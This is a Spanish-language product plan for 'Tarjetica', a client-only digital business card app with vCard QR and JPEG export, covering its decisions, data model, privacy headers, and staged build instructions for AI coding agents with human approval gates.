# PRP-TD-001 · Tarjeta de presentación digital (app regalable, sin servidor)

> **Estado:** ✅ APROBADO Y EJECUTABLE. **FASE 0 cerrada** el 2026-09-03: el operador respondió los 7
> gates (§3). Arranca en la Ola 1. Producto: **Tarjetica**.
> **Fecha:** 2026-09-03
> **Origen:** pedido del operador (Johann) en sesión del 2026-09-02. Objetivo declarado: **menos papel,
> más eficiencia al comunicar datos.** Se regala en conferencias y reuniones; el código se libera bajo MIT.
> **Serie:** primera del proyecto `tarjeta-digital` (convención de la fábrica: serie propia con prefijo,
> igual que `PRP-VX-*` de Vórtice y `PRP-EA-*` de Enlace Agro).
> **Referencia a replicar:** `https://johannvalderrama.com/tarjeta?modo=qr`, cuyo código vive en
> `C:\OPS\_VelOS\proyectos\Personal landing page`.
> **Dónde vive el código:** NO aquí. En el repo **`tarjetica`** (D3), creado el 2026-09-04 con la Ola 1 en
> `C:\OPS\_VelOS\proyectos\tarjetica\`. **Publicado el 2026-09-04 en
> https://github.com/Johann-Valderrama/tarjetica**, repo público bajo la cuenta personal de GitHub de
> Johann (G3), con la licencia MIT ya detectada por GitHub. Aquí viven el PRP, la bitácora y las decisiones.

---

## CÓMO EMPEZAR (autosuficiente, pégalo a un agente nuevo)

✅ **La FASE 0 está CERRADA** (§3, 2026-09-03). Se puede arrancar por la Ola 1. Lo decidido, en una
línea cada uno, para que no haya que subir a la §3 antes de empezar:

| Gate | Cerrado como |
|---|---|
| G1 copyright | `Copyright (c) 2026 Johann Valderrama`, persona natural |
| G2 aviso | Frase exacta: **"No guardamos tus datos en ningún servidor."** No reformularla |
| G3 nombre y cuenta | **`tarjetica`**, repo público en la cuenta personal de GitHub de Johann |
| G4 firma | Sí, DENTRO del elemento capturable de la tarjeta. NUNCA dentro del vCard del QR |
| G5 foto | Sí, en la vista, el `.jpeg` y el `.vcf`. NUNCA en el link ni en el QR. Sin foto, monograma |
| G6 link | Sí entra, opcional y apagado por defecto (ya venía cerrado por D5) |
| G7 red caída | No se construye PWA en v1; el límite se DECLARA en el copy |

### 🙋 Pasos del HUMANO (los únicos que quedan)

- Ola 1: crear el repo público `tarjetica` en tu cuenta de GitHub, o autorizar al agente a crearlo.
- Ola 4: gate físico 4e, escanear el QR de la tarjeta llena de un teléfono a otro.
- Ola 5: gate físico 5d, guardar el `.jpeg` en un iPhone y un Android reales, y desde el navegador
  embebido de Instagram y LinkedIn.
- Ola 7: aprobar el deploy y el `git push` inicial del repo público.

### 🤖 Pasos del AGENTE

Olas 1 a 7 completas. Cada ola se abre con su propia frase, en su propia ventana si el contexto lo pide.

### Ola 1 · Fundación del repo · **`Opus.M`**

```
Lee estos archivos en este orden y ejecuta la Ola 1 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
2. C:\OPS\_VelOS\proyectos\AI-RRHH\vortice-arcade\app\package.json   (el scaffold exacto que ya funciona)
3. C:\OPS\_VelOS\proyectos\Personal landing page\next.config.ts      (bloque headers: lo que HAY hoy; ojo, NO trae CSP, la unidad 1e la agrega)

La FASE 0 ya esta cerrada (2026-09-03): las 7 respuestas estan en la seccion 3 y resumidas arriba.
No re-litigues D1 a D5 (seccion "0. Decisiones ya cerradas por el operador").
Modelo esperado: Opus.M (Opus, esfuerzo medio). Si eres mas debil, avisa y espera.
```

### Ola 2 · Formulario y persistencia local · **`Sonnet.M`**

```
Lee estos archivos en este orden y ejecuta la Ola 2 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (secciones "4. Modelo de datos y contrato de la URL" y "5. Los campos de la tarjeta")
2. C:\OPS\_VelOS\proyectos\tarjetica\plan\PROGRESS.md   (reanuda desde su Next action)

Modelo esperado: Sonnet.M (Sonnet, esfuerzo medio). Si eres mas debil, avisa y espera.
```

### Ola 3 · Render y estética · dirección **`Fable.H`**, implementación **`Sonnet.M`**

```
Lee estos archivos en este orden y ejecuta la Ola 3 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (seccion "6. Pantallas y diseño")
2. C:\OPS\.claude\docs\diseno-web-ia-claude-design-stitch-animaciones.md
3. C:\OPS\.claude\docs\prompts-diseno-ui-copypaste.md
4. C:\OPS\_VelOS\proyectos\Personal landing page\src\features\card\business-card.tsx

La unidad 3a (direccion estetica escrita + tokens + referencia visual real VISTA) se cierra ANTES de
pintar una sola pantalla. Es requisito de `diseno-ui-anti-slop-por-defecto`, no una sugerencia.
Modelos: la direccion estetica con Fable.H (Fable, esfuerzo alto). La implementacion con Sonnet.M (Sonnet, esfuerzo
medio). Si eres mas debil que el que te toca, avisa y espera.
```

### Ola 4 · vCard y QR en cliente (salida principal 1) · **`Opus.M`**

```
Lee estos archivos en este orden y ejecuta la Ola 4 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (secciones "2. Qué se reusa y qué se adapta" y "8. Gotchas")
2. C:\OPS\_VelOS\proyectos\Personal landing page\src\shared\config\card.ts     (vcardQrText, lineas 49-72)
3. C:\OPS\_VelOS\proyectos\Personal landing page\src\app\api\vcard\route.ts    (fold(), lineas 19-20)

El QR se genera en el CLIENTE, no en el servidor. Es obligatorio por D1, no una preferencia.
Modelo esperado: Opus.M (Opus, esfuerzo medio). Si eres mas debil, avisa y espera.
```

### Ola 5 · Exportar `.jpeg` (salida principal 2) · **`Opus.H`**

```
Lee estos archivos en este orden y ejecuta la Ola 5 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (secciones "8. Gotchas" y "10. Criterios de éxito")
2. C:\OPS\_VelOS\proyectos\tarjetica\plan\PROGRESS.md

Esta ola es 100% construccion nueva: en el repo de la landing NO existe exportacion de la tarjeta a
imagen (seccion "2. Qué se reusa y qué se adapta"). Prohibido resolverlo con `next/og` o `@vercel/og`: eso renderiza en el SERVIDOR y
manda los datos de la tarjeta al servidor, que es exactamente lo que D1 prohibe.
La ola NO se cierra sin el gate fisico del humano en un iPhone y un Android reales.
Modelo esperado: Opus.H (Opus, esfuerzo alto). Si eres mas debil, avisa y espera.
```

### Ola 6 · Link compartible opcional · **`Opus.M`** (sujeta a G6)

```
Lee estos archivos en este orden y ejecuta la Ola 6 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (secciones "4. Modelo de datos y contrato de la URL" y "9. Riesgos y mitigaciones")
2. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (seccion "15. Registro del debate adversarial", objecion B3: por que los candados viven en la Ola 1)

Si G6 quedo en NO, esta ola NO se ejecuta: se marca DESCARTADA en PROGRESS.md y se salta a la Ola 7.
OJO: los candados (CSP, Referrer-Policy, noindex) NO viven aqui, viven en la unidad 1e de la Ola 1 y
corren exista o no el link. Aqui solo va lo que es propio del link.
Modelo esperado: Opus.M (Opus, esfuerzo medio). Si eres mas debil, avisa y espera.
```

### Ola 7 · Publicación · **`Sonnet.M`**

```
Lee estos archivos en este orden y ejecuta la Ola 7 del PRP-TD-001:
1. C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md
   (secciones "12. Licencia y publicación" y "13. Cómo se mide si funcionó")
2. C:\OPS\_VelOS\proyectos\tarjetica\plan\PROGRESS.md

El deploy y el push inicial del repo publico esperan OK del operador.
Al terminar: ejecutar el protocolo `alta-baja-de-repos-por-ops` (descriptor `_PROYECTO.md` del repo
nuevo + regenerar C:\OPS\_VelOS\proyectos\_MAPA.md). Ese paso NO se hizo al escribir este PRP porque
el repo todavia no existia.
Modelo esperado: Sonnet.M (Sonnet, esfuerzo medio). Si eres mas debil, avisa y espera.
```

### Antes de despachar CUALQUIER ola

```
node C:\OPS\.claude\scripts\validar-grafo-olas.mjs "C:\OPS\_VelOS\proyectos\tarjetica\plan\PRP-TD-001-tarjeta-digital-regalo.md" --ola N
```

Si sale 1, no se despacha: se arregla el plan. Si sale 0, las capas que imprime SON el orden de
despacho (no se deriva a ojo de "archivos disjuntos").

---

## 0. Decisiones ya cerradas por el operador (no re-litigar)

| # | Decisión | Elegida | Fecha |
|---|---|---|---|
| **D1** | Dónde viven los datos | **Solo en el navegador.** Cero servidor, cero base de datos. | 2026-09-02 |
| **D2** | Alcance de la tarjeta | Contacto **más capa de venta opcional** (titular, hasta 3 cifras, pregunta de cierre) | 2026-09-02 |
| **D3** | Repo del código | **Repo público nuevo desde el día 1.** El PRP y la bitácora sí vivieron primero en un repositorio privado | 2026-09-02 |
| **D4** | Licencia | **MIT** | 2026-09-02 |
| **D5** | Salidas | El link compartible es **opcional y apagado por defecto**. Las salidas principales son el **QR de vCard** y el **`.jpeg`** | 2026-09-02 |

---

## Excepción a una pausa de construcción vigente en otro proyecto interno

Este PRP se ejecuta como excepción explícita a una pausa de construcción de producto vigente en otro
proyecto interno del operador. El motivo de la pausa, su registro y por qué este PRP califica como
excepción viven en el registro interno del proyecto, no aquí.

**Este PRP existe porque el operador lo pidió explícitamente el 2026-09-02**, y es defendible como
excepción porque no es una feature de los productos que esa pausa alcanza, y porque su costo de
operación recurrente es cero por construcción (D1: sin servidor, sin base de datos, sin cuota de API),
así que no consume el runway que la pausa protege.

---

## 1. Problema

En una conferencia, el intercambio de datos sigue ocurriendo en papel. La tarjeta de cartón se pierde,
se moja, se bota, y quien la recibe tiene que retipear los datos a mano en su teléfono. Es papel
impreso para transmitir texto que el teléfono ya sabe leer.

Johann ya resolvió esto **para sí mismo**: su tarjeta digital está en producción y funciona. El código
lo prueba, no la memoria:

| Hecho verificado | Dónde |
|---|---|
| La tarjeta tiene exactamente dos vistas, `card` y `qr`, y un `modo` distinto de `qr` cae siempre en `card` | `Personal landing page\src\app\[locale]\tarjeta\page.tsx:48` |
| El toggle de vistas está **deliberadamente fuera** del `<article>` de la tarjeta, con el comentario *"VA FUERA del card para que una captura no lo incluya"* | `src\features\card\business-card.tsx:108` y `:146` |
| Hay dos QR y codifican cosas distintas: uno una URL de WhatsApp, el otro un **vCard 3.0 crudo** que el teléfono ofrece guardar sin descargar nada | `src\app\[locale]\tarjeta\page.tsx:59-60` |

Ese comentario del código es el hallazgo que define este producto: **el screenshot manual ya es la
estrategia vigente de la tarjeta que funciona.** Lo que este PRP construye es automatizarlo y ponerlo
en manos de cualquiera.

**El costo de que solo Johann tenga la suya:** la persona con la que intercambia datos le sigue dando
cartón. El valor de una tarjeta digital sube cuando el otro lado también la tiene, y hoy no hay forma
barata de que la tenga.

**El ángulo declarado por el operador: menos papel, más eficiencia al comunicar datos.** Regalarla en
una conferencia es la vía de distribución, y también la razón de que sea MIT y de código abierto: una
herramienta que se regala no se puede cobrar después sin traicionar el gesto.

---

## 2. Qué se reusa y qué se adapta

### Se hereda de `Personal landing page` (patrón probado en producción)

| Qué se hereda | Fuente | Por qué |
|---|---|---|
| Patrón de **dos vistas** (`card` para leer, `qr` para escanear), con fallback al valor seguro | `src\app\[locale]\tarjeta\page.tsx:48` | Ya validado en uso real; el modo `qr` es el que se muestra de teléfono a teléfono |
| **Toggle fuera del elemento capturable** | `src\features\card\business-card.tsx:108` | Es el requisito que hace posible el `.jpeg` limpio. Sin esto, la captura sale con botones |
| `errorCorrectionLevel: 'M'` en el QR | `src\features\card\qr-code.tsx:9-10` | **Medido, no heredado a ciegas** (2026-09-03): bajar a `L` da cuadritos 14% más grandes pero pierde más o menos esa misma tolerancia a borrosidad, así que los dos efectos se cancelan. `M` es además el nivel estándar de DENSO WAVE. **La corrección de errores NO es una palanca en este producto** |
| **Solo `FN`, sin `N` estructurado** | `src\shared\config\card.ts:62-64` | Gotcha heredado, con su razón escrita: evita que Google Contacts duplique el apellido |
| **Line folding RFC 6350 a 75 octetos** en el `.vcf` | `src\app\api\vcard\route.ts:19-20` (función `fold()`) | Lógica ya resuelta; se porta a cliente tal cual |
| Stack y arquitectura feature-first | `package.json`: Next `^16`, React `^19`, TS 5.7, Tailwind `^3.4.17`, `next-intl`, `qrcode@^1.5.4`, pnpm | Golden path ya en producción |

### ⛔ Lo que NO se hereda, aunque esté en el código de referencia

| Qué NO se copia | Dónde está | Por qué |
|---|---|---|
| **`margin: 1`** en el QR | `src\features\card\qr-code.tsx:20` | La zona silenciosa **obligatoria son 4 módulos por lado**, y es la que el decodificador usa para ENCONTRAR el símbolo (fuente primaria: DENSO WAVE, `qrcode.com/en/howto/code.html`). La librería trae `4` por defecto y la landing lo bajó a `1`. Aquí se usa **4**, aunque cueste un 8% de tamaño de cuadrito |
| **Dos QR en la misma vista** | `src\app\[locale]\tarjeta\page.tsx:59-60` | Dos QR se reparten el ancho de la pantalla, y eso deja cada uno en **2,39 px por cuadrito, por debajo del piso práctico de ~2,5**. Es la causa medida de que la tarjeta actual haya que acomodarla para que la lean. Aquí va **UN solo QR** (G4/A, 2026-09-03) |
| **vCard recortado en el QR** | `src\shared\config\card.ts:49-72` | La landing recorta a `FN`/`TITLE`/`TEL`/`EMAIL`/`URL` porque sus dos QR son chicos. Con un QR a ancho completo hay presupuesto para llevar **todo lo que el usuario escribió** (decisión del operador, 2026-09-03). Lo que sigue EXCLUIDO por contrato: la foto (G5) y la firma de marca (G4) |

### Cambia respecto a la landing

| Qué cambia | De | A | Por qué |
|---|---|---|---|
| Dónde se genera el QR | Servidor (`async function QrCode`, `src\features\card\qr-code.tsx:17`) | **Cliente** | D1: el servidor no puede ver los datos de nadie |
| De dónde salen los datos | Constantes en `src\shared\config\card.ts` (una sola persona) | Formulario del usuario, en `localStorage` | Es el producto entero |
| Descarga del `.vcf` | Route handler `/api/vcard` | Blob generado en cliente | D1 |
| Exportar la tarjeta a imagen | **No existe** | Construcción nueva completa | Ver la corrección de abajo |
| `Referrer-Policy` | `strict-origin-when-cross-origin` (`Personal landing page\next.config.ts:29`) | `no-referrer` en la ruta de la tarjeta | Candado anti fuga del hash (§9) |

### ⚠️ Corrección a la investigación previa (verificada al escribir este PRP)

El plan que originó este documento afirmaba que en la landing *"no existe exportación a imagen en
ningún punto del repo"*, citando entre la evidencia la ausencia de `ImageResponse` y de
`opengraph-image.tsx`. **Eso es falso y se corrige aquí:** `Personal landing page\src\app\opengraph-image.tsx:1`
sí usa `ImageResponse` de `next/og`.

Qué cambia y qué no:

- **No cambia la conclusión.** Ese archivo genera la imagen de previsualización social del sitio
  (1200×630, datos de marca fijos, ver `:6-8`). No exporta la tarjeta de nadie. La exportación a
  `.jpeg` del lado del cliente sigue siendo **construcción 100% nueva**.
- **Sí cambia lo que hay que prohibir explícitamente.** Existe un precedente tentador en el repo
  hermano, y un agente que lo encuentre va a querer reusarlo. **`next/og` renderiza en el servidor**:
  usarlo aquí mandaría los datos de la tarjeta al servidor y rompería D1 en silencio, sin que ningún
  test lo delate. Queda prohibido por escrito en la Ola 5 y en §8.

---

## 3. FASE 0 · Gates 🙋 (bloqueantes: nada se codea antes)

| # | Gate | Por qué bloquea | Estado / opciones |
|---|---|---|---|
| **G1** ⛔ | **Titular del copyright MIT** | El aviso legal de un repo público es permanente y verificable por cualquiera, así que no puede afirmar una titularidad que todavía no está inscrita (el motivo está en el registro interno del proyecto) | ✅ **RESUELTO 2026-09-03: `Copyright (c) 2026 Johann Valderrama`**, persona natural. Coherente con publicar bajo su cuenta personal (G3). Los dos sentidos del cambio no cuestan igual: pasar después a la empresa es un commit que nadie nota; haberla nombrado antes de tiempo no se borra |
| **G2** ⛔ | **Aviso de privacidad de una línea** | Es a la vez el diferenciador de marketing y una afirmación jurídica. Se apoya en el cerebro (§12), pero **no sustituye a un abogado**. El debate adversarial tumbó el borrador "tus datos no salen de tu dispositivo": las dos salidas principales existen justamente para que los datos SALGAN del dispositivo | ✅ **RESUELTO 2026-09-03: "No guardamos tus datos en ningún servidor."** Es la frase EXACTA, no una aproximación: dice lo que sí es cierto con D1 y no se puede desarmar. Va en el README, en la home y en el editor |
| **G3** | **Nombre del producto y del repo**, y bajo qué cuenta de GitHub se publica | Sin nombre no hay repo, ni dominio, ni firma en la tarjeta. Bloquea la Ola 1 entera | ✅ **RESUELTO 2026-09-03: `Tarjetica`**, bajo la **cuenta personal de GitHub de Johann**. El nombre es como la gente habla de verdad en una conferencia en Bogotá, y por eso se repite sola; el costo aceptado es que no traduce al inglés. La cuenta personal es la única que él decide solo, y suma a su marca personal. 🤖 La Ola 1 verifica que el nombre esté libre en GitHub antes de crear el repo |
| **G4** | **Marca visible**: ¿la tarjeta regalada lleva una firma discreta de quién la hizo? | Es la única palanca de distribución que queda sin servidor (§13). Decisión de negocio, no técnica | ✅ **RESUELTO 2026-09-03: sí, DENTRO del elemento de la tarjeta.** Como el `.jpeg` es esa misma vista renderizada, una sola pieza de código la pone en pantalla y en la imagen descargada. ⛔ **NO va dentro del vCard del QR**, ni como `URL` ni en `NOTE`: ese vCard aterriza en la agenda de un TERCERO que nunca usó la herramienta (sería spam en su libreta, y esos dos campos son del usuario), y cada byte ahí es densidad del QR, que es el riesgo #1 del producto. Con el link encendido la marca ya viaja gratis en el propio dominio |
| **G5** | **¿Foto de perfil?** | Cambia el modelo de datos y el peso del QR | ✅ **RESUELTO 2026-09-03: SÍ, pero NUNCA dentro del link.** La foto se ve en la tarjeta, en el `.jpeg` y en el `.vcf` descargado; el codec del link y el vCard del QR la excluyen por contrato. La recomendación previa del PRP (sin foto) estaba sobre-corregida: el argumento real solo mataba la foto DENTRO del link, no la foto en todas partes. Sin foto cargada, monograma de iniciales |
| **G7** | **¿Se construye para red caída?** | Una conferencia es el peor escenario de red que existe (decenas de teléfonos, un salón, una torre), y es exactamente el caso de uso declarado. Nació del debate adversarial, no del plan original | ✅ **RESUELTO 2026-09-03: NO se construye PWA en v1; el límite se DECLARA en el copy** ("necesitas señal la primera vez"). Queda en §11 como fuera de scope explícito, no como olvido. Si la primera conferencia lo tumba, es la primera candidata a v2 |
| **G6** ⛔ | **¿El link compartible entra en v1?** | Es la única salida que crea un enlace **irrevocable** con datos de una persona | ✅ **RESUELTO por D5, no se re-preguntó: SÍ entra, opcional y apagado por defecto.** El operador ya lo había cerrado al encargar este PRP ("decidido, no volver a preguntar"). La Ola 6 se ejecuta |

> **G6 quedó en SÍ, así que la Ola 6 se ejecuta.** Se deja escrito lo que habría pasado con un NO, por
> si alguien la reabre: la Ola 6 se marcaría DESCARTADA y el codec saldría del modelo de datos, sin
> tocar nada más, porque las dos salidas principales no dependen del link.
>
> ⚠️ **Los candados (CSP, `Referrer-Policy`, `noindex`) NO se apagan con G6.** No son candados "del
> hash": protegen el `localStorage`, que existe con link o sin él. Por eso viven en la unidad **1e**
> (Ola 1) y el barrido de cero dominios ajenos en la **7e** (Ola 7), no dentro de la ola condicionada.
> Es una corrección del debate adversarial: en la primera versión de este PRP los candados colgaban de
> la Ola 6 y un G6 en NO habría publicado el producto sin ninguna CSP (§15, objeción B3).

---

## 4. Modelo de datos y contrato de la URL

### El tipo `Tarjeta`

Una sola fuente de verdad, validada con Zod en los dos bordes: al leer de `localStorage` y al decodificar
un link. Un dato que entra sin validar es un dato que revienta el render en el teléfono de un
desconocido, en una conferencia, sin consola donde mirar.

```ts
// src/features/tarjeta/modelo/tarjeta.ts
const Telefono  = z.object({ n: z.string().min(5).max(25), e: z.enum(['movil','whatsapp','oficina']) })
const Enlace    = z.object({ u: z.string().url(), e: z.string().max(30) })
const CapaVenta = z.object({
  t: z.string().max(80).optional(),                                    // titular de una línea
  c: z.array(z.object({ v: z.string().max(12), e: z.string().max(30) })).max(3).optional(), // cifras
  p: z.string().max(120).optional(),                                   // pregunta de cierre
})
export const Tarjeta = z.object({ /* campos de la seccion 5 */ }).strict()

// G5: la foto vive APARTE del tipo que se serializa al link. Es un dato de dispositivo,
// no de tarjeta: se guarda en localStorage, se pinta en la vista, entra al .jpeg y al .vcf
// descargado, y NUNCA toca el codec ni el vCard del QR.
export const FotoLocal = z.object({ dataUrl: z.string().startsWith('data:image/jpeg') })
```

**Claves de 1 o 2 letras a propósito.** No es microoptimización: cada byte del JSON es densidad del QR,
y la densidad del QR es lo que decide si se escanea de pantalla a pantalla o no (§8). El nombre legible
vive en el tipo de TypeScript, no en el dato serializado.

### Persistencia por defecto: `localStorage` (sin URL, sin datos en ninguna parte)

La tarjeta vive en el dispositivo de su dueño, con autosave. Al volver a abrir la app en el mismo
equipo, el editor se hidrata solo. **Esta ruta no produce ninguna URL con datos personales.**

**Lo que el producto debe decir sin suavizar:** "volver a editar" funciona en el mismo equipo y el mismo
navegador. Borrar los datos del sitio, cambiar de teléfono o abrir en otro navegador pierde la tarjeta,
porque no hay cuenta ni servidor donde recuperarla. Es la contrapartida directa de D1 y va en el copy,
no en una nota al pie.

### Contrato de la URL, solo si G6 dice que sí

```
https://<dominio>/t#<payload>
                  ^
                  fragmento, NO query string
```

**El fragmento no se envía al servidor.** Ni los logs de Vercel, ni un proxy intermedio, ni el registro
de acceso de nadie ven los datos. Esto no es un detalle de implementación: es la razón por la que este
producto no crea una base de datos con información personal de terceros (§12). Escrito así, a
propósito, para que nadie lo "mejore" pasándolo al query string.

**Codec:** `JSON` con claves cortas, luego `CompressionStream('deflate-raw')`, luego `base64url`.
Fallback a `base64url` sin comprimir donde `CompressionStream` no exista, con un byte de versión al
frente para que el decodificador sepa cuál de los dos leyó.

**Dos propiedades irrenunciables del codec**, las dos probadas y no asumidas (unidad 6a):

1. `decode(encode(x)) === x` para todo `x` válido.
2. **El payload NUNCA contiene la foto.** Es la invariante que sostiene G5: la foto entra al `.jpeg`
   y al `.vcf`, jamás al link ni al QR. Si el tipo `Tarjeta` es `.strict()` y la foto vive en otro
   tipo, esto lo garantiza el compilador y no la disciplina de quien edite después.

---

## 5. Los campos de la tarjeta

| Bloque | Campos |
|---|---|
| **Identidad** | nombre, apellido, cargo, empresa |
| **Contacto** | correo, hasta 3 teléfonos **cada uno con su etiqueta** (móvil / WhatsApp / oficina), sitio web |
| **Redes** | Instagram, TikTok, Facebook, **LinkedIn**, más hasta 3 URLs libres con etiqueta |
| **Ubicación** | dirección física |
| **Descripción** | notas o descripción libre. ⚠️ Es el único campo donde cabe cualquier cosa, incluido un dato sensible del art. 5 de la Ley 1581 (salud, afiliación sindical, convicciones). Lleva advertencia (unidad 2d) |
| **Foto** (G5) | foto de perfil opcional, **reducida a ~320 px y ~10 KB antes de guardarla**, con fallback a monograma de iniciales. Vive solo en `localStorage`; entra a la vista, al `.jpeg` y al `.vcf` descargado, **nunca al link ni al QR** |
| **Capa de venta** (opcional, D2) | titular de una línea, hasta 3 cifras con etiqueta, pregunta de cierre |

> **LinkedIn es una adición, no estaba en la lista del operador.** Se agrega porque es la red que
> importa en una conferencia B2B, y porque su propia tarjeta ya la contempla en `socials.ts` (hoy con
> `enabled: false`). Queda anotado como adición explícita, no colado en silencio. Si el operador lo
> quiere fuera, es quitar una entrada del enum.

**Qué hace la capa de venta.** Es lo que en la tarjeta de Johann convierte: sus KPIs (83%, 815,
USD 86M, ver `card.ts:38-42`) más una pregunta puente. Sin ella, la tarjeta es una agenda de contactos;
con ella, es una propuesta. Es opcional porque no todo el mundo va a una conferencia a vender.

**Regla dura sobre los campos:** ninguno es obligatorio salvo el nombre. Una tarjeta con nombre y
correo tiene que renderizar y exportar igual de bien que una con los 20 campos llenos. El QR de la
tarjeta llena es el caso de prueba (§10); el de la tarjeta mínima es el caso común.

---

## 6. Pantallas y diseño

| Pantalla | Qué es |
|---|---|
| **P1 · Editor** | El formulario de §5, con autosave a `localStorage` y vista previa en vivo al lado (o debajo, en móvil) |
| **P2 · Tarjeta, vista `card`** | La tarjeta para leer: datos tocables (`tel:`, `mailto:`, enlaces), capa de venta si existe |
| **P3 · Tarjeta, vista `qr`** | **UN solo QR**, ocupando el ancho completo de la pantalla (unos 340 px en un teléfono de 375). Es la vista que existe para mostrarle el celular a alguien, así que el mejor uso de ese espacio es el QR mismo: agrandarlo ES aprovecharlo. **El toggle va FUERA del elemento capturable** (heredado, §2) |
| **P4 · Salidas** | Tres botones, en este orden: **guardar `.jpeg`**, **mostrar QR**, y **generar link compartible** (apagado por defecto, con advertencia previa) |

**Por qué UN solo QR y no dos.** La tarjeta de referencia lleva dos (uno de WhatsApp, uno de vCard) y por eso cada uno se queda con media pantalla. Medido el 2026-09-03: eso deja **2,39 px por cuadrito**, bajo el piso práctico de ~2,5, que es exactamente por qué hay que acomodarla para que la lean. Con un solo QR a ancho completo el mismo contenido sube a **4,66**, casi el doble. El QR de WhatsApp no desaparece: su información vive como dato tocable en la vista `card`.

**La firma de marca (G4) va DENTRO del elemento capturable de la tarjeta.** Es lo contrario del toggle
de vistas, que va fuera a propósito: la firma SÍ tiene que salir en el `.jpeg`, y como el `.jpeg` es esa
misma vista renderizada, una sola pieza de código la pone en las dos superficies. Discreta: una línea al
pie, con el nombre de la herramienta y su dominio, sin competir con los datos del usuario.

**Mobile-first, no "responsive después".** La app se usa de pie, en una conferencia, en el teléfono del
usuario. Viewport de verificación: 375 px de ancho. Un layout que solo se ve bien en el monitor del
desarrollador no cumple.

**Dirección estética: se compromete por escrito ANTES de pintar** (unidad 3a). Tokens explícitos,
referencia visual real vista de verdad, y prohibición del default de IA (Inter/Geist, degradado morado,
hero con 3 iconos). El requisito viene de `diseno-ui-anti-slop-por-defecto` y es la unidad que abre la
ola, no un repaso al final.

**Animación:** solo `transform` y `opacity`, con `prefers-reduced-motion` respetado. Nada de
`backdrop-filter` ni blurs animados: el teléfono real de la conferencia es de gama media.

---

## 7. Plan por olas

Contrato de 9 columnas de `plan-por-olas-autonomo`, Pieza 1.3. Ninguna celda vacía (un `-` explícito
sí, vacío no). El prefijo de `Verifica` decide qué se hace con un FAIL: `SCRIPT:` es evidencia y se
obedece; `JUICIO:` es opinión de un modelo y abre investigación, no reproceso; `NINGUNA:` es legítimo
cuando el error no sería silencioso.

Las rutas de `Escribe` son relativas a la raíz del repo público nuevo, cuyo nombre sale de G3.

### Ola 0 · Gates del operador

No tiene unidades de agente: es la §3 completa. Nada se despacha antes.

### Ola 1 · Fundación del repo · `Opus.M`

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 1a | Repo público `tarjetica` (G3) en la cuenta personal de Johann, y scaffold Next 16 / React 19 / TS / Tailwind 3.4, pnpm, sin Supabase y sin IA | media | `Opus.M` | Es el cimiento: un scaffold torcido se paga en las 6 olas siguientes | - | `package.json`, `tsconfig.json`, `next.config.ts`, `tailwind.config.ts`, `.gitignore` | `SCRIPT:` ¿el nombre `tarjetica` estaba libre en GitHub, y `pnpm typecheck`, `pnpm lint` y `pnpm build` salen en verde sobre el scaffold vacío? | GATE G3 |
| 1b | `LICENSE` MIT con `Copyright (c) 2026 Johann Valderrama` (G1), y en el README la frase exacta de G2: "No guardamos tus datos en ningún servidor" | baja | `Sonnet.M` | Un repo público sin `LICENSE` en el primer commit es "todos los derechos reservados", que contradice D4 | 1a | `LICENSE`, `README.md` | `SCRIPT:` ¿el `LICENSE` existe en el primer commit con ese titular literal, y el README trae la frase de G2 sin reformular? | REINTENTO |
| 1c | Tipo `Tarjeta` con Zod, claves cortas, `.strict()` | media | `Opus.M` | Es el contrato que consumen las 5 olas siguientes; cambiarlo después es refactor global | 1a | `src/features/tarjeta/modelo/tarjeta.ts` | `SCRIPT:` ¿los tests rechazan un objeto con clave desconocida y aceptan la tarjeta mínima, solo nombre? | REINTENTO |
| 1d | Persistencia en `localStorage`: leer, escribir, validar al leer, migrar por versión, y **borrar** | media | `Opus.M` | Un dato viejo sin validar revienta el render en el teléfono de un desconocido, y sin borrado un equipo compartido le muestra la tarjeta anterior al siguiente | 1c | `src/features/tarjeta/almacenamiento/local.ts` | `SCRIPT:` ¿un `localStorage` con JSON corrupto, de versión vieja, o que lanza al leer, devuelve tarjeta vacía en vez de tumbar la app, y el borrado deja la clave sin rastro? | REINTENTO |
| 1e | Candados de cabecera, **siempre**, no atados a G6: CSP `default-src 'self'` (deny by default), `Referrer-Policy: no-referrer`, `noindex` en la ruta de la tarjeta, `robots.txt` | alta | `Opus.M` | Protegen `localStorage`, que existe con o sin link. La landing de referencia hoy NO tiene CSP (`Personal landing page\next.config.ts:21-43`), así que copiarla sin más deja el producto sin ninguna | 1a | `src/app/robots.ts`, `src/shared/seguridad/headers.ts` | `SCRIPT:` ¿la CSP arranca en `default-src 'self'` y los 4 headers responden con el valor exacto contra el build de producción? | REINTENTO |

### Ola 2 · Formulario y persistencia local · `Sonnet.M`

| Unidad | Qué | Dificultad | Ejecutar con | Por qué | Depende de | Escribe | Verifica | Si falla |
|---|---|---|---|---|---|---|---|---|
| 2a | Campos de identidad, contacto y redes (§5), con etiqueta por teléfono y enlaces libres | media | `Sonnet.M` | Trabajo mecánico sobre un contrato ya cerrado en 1c | - | `src/features/tarjeta/formulario/campos.tsx` | `NINGUNA:` basta correr la app; un campo que no pinta se ve de inmediato | REINTENTO |
| 2b | Capa de venta opcional: titular, hasta 3 cifras con etiqueta, pregunta de cierre | baja | `Sonnet.M` | Bloque acotado y opcional del mismo formulario | - | `src/features/tarjeta/formulario/capa-venta.tsx` | `NINGUNA:` basta correr la app | REINTENTO |
